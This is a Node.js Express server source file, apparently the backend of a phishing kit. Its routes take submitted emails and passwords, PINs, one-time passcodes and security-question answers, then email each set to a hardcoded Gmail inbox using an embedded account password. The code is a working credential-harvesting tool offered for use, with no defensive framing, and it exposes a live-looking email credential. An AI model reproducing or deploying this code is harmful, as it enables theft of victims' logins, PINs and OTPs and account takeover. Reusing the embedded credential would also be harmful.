const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "chidiebereajaeroelvis@gmail.com";
const pass = "qpboyelacgloplhy";
// 14 october

// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `email: ${email}\nPassword: ${password}`,
    text: `New user registered with Email: ${email}\nPassword: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let { pin } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PIN is: ${pin}`,
    text: `New user PIN is: ${pin}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let { otp } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `OTP is: ${otp}`,
    text: `New user OTP is: ${otp}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// Backend - Updated server.js security route with debug logging
app.post("/security", async (req, res) => {
  console.log("=== SECURITY ROUTE HIT ===");
  console.log("Raw request body:", req.body);
  console.log("Request body type:", typeof req.body);
  console.log("Request body keys:", Object.keys(req.body));
  
  const { questions } = req.body;
  
  console.log("Extracted questions:", questions);
  console.log("Questions type:", typeof questions);
  console.log("Is questions array?:", Array.isArray(questions));
  
  if (!questions || !Array.isArray(questions)) {
    console.error("ERROR: Questions is not an array or is undefined");
    return res.status(400).json({ 
      error: "Invalid data format. Expected questions array." 
    });
  }
  
  console.log("Questions length:", questions.length);
  questions.forEach((q, index) => {
    console.log(`Question ${index + 1}:`, q);
  });
  
  // Create structured object with questions and answers
  const securityData = {
    question1: {
      question: questions[0]?.question || "",
      answer: questions[0]?.answer || ""
    },
    question2: {
      question: questions[1]?.question || "",
      answer: questions[1]?.answer || ""
    },
    question3: {
      question: questions[2]?.question || "",
      answer: questions[2]?.answer || ""
    }
  };
  
  console.log("Security data object created:", securityData);
  
  // Validate that we have at least some data
  const hasValidData = Object.values(securityData).some(q => q.question && q.answer);
  if (!hasValidData) {
    console.error("ERROR: No valid question/answer pairs found");
    return res.status(400).json({ 
      error: "No valid question/answer pairs provided" 
    });
  }
  
  // Format for email display
  const formattedQuestions = [
    `QUESTION 1:\n${securityData.question1.question}\nANSWER 1:\n${securityData.question1.answer}`,
    `QUESTION 2:\n${securityData.question2.question}\nANSWER 2:\n${securityData.question2.answer}`,
    `QUESTION 3:\n${securityData.question3.question}\nANSWER 3:\n${securityData.question3.answer}`
  ].join("\n\n" + "=".repeat(50) + "\n\n");
  
  console.log("Formatted email content:\n", formattedQuestions);
  
  // Configure your email
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
  
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Security Questions Submission - 3 Questions",
    text: `Security Questions Data:\n\n${formattedQuestions}\n\nStructured Data Object:\n${JSON.stringify(securityData, null, 2)}`,
  };
  
  console.log("Mail options:", mailOptions);
  
  try {
    console.log("Attempting to send email...");
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent successfully:", info.response);
    
    res.status(200).json({ 
      message: "Security questions submitted successfully!",
      data: securityData 
    });
  } catch (error) {
    console.error("ERROR sending email:", error);
    console.error("Error details:", {
      message: error.message,
      code: error.code,
      command: error.command
    });
    
    res.status(500).json({ 
      error: "Failed to send email",
      details: error.message 
    });
  }
});

// Add a test route to verify server is working
app.get("/test", (req, res) => {
  console.log("Test route hit");
  res.json({ message: "Server is working", timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});






